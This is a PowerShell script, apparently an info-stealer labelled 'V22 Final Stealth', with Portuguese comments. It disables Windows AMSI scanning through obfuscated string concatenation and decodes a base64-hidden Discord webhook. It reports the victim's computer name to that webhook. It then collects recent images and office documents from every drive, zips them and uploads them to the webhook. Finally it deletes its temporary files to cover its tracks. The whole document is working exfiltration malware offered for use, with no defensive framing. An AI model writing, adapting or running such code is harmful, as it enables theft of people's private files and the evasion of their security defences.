# [V22: Bypass Stealth por Concatenação]
$a = "Sys" + "tem.Man" + "age" + "ment.Auto" + "mation."
$b = "Am" + "si" + "Ut" + "ils"
$c = [Ref].Assembly.GetType($a + $b)
$d = "am" + "si" + "Init" + "Fai" + "led"
$f = $c.GetField($d, "NonPublic,Static")
$f.SetValue($null, $true)

# 1. Configurações de Rede (TLS 1.2)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))

# Notificação de Sucesso
curl.exe -k -s -F "content=🚀 V22 (Final Stealth) Ativo em $env:COMPUTERNAME" $u

$tempDir = "$env:TEMP\sys_$(Get-Random)"
$exclude = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 2. Busca e Filtragem (Conforme os teus objetivos de exfiltração)
$e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $p = $_.FullName
        $isEx = $false; foreach($d in $exclude){if($p.StartsWith($d)){$isEx=$true;break}}
        !$isEx -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
    } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
}

# 3. Compactação e Envio
$zipFile = "$env:TEMP\win_data.tmp"
if ((Get-ChildItem $tempDir).Count -gt 0) {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
    curl.exe -k -s -F "file=@$zipFile" $u
}

# Limpeza e Auto-Destruição
Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
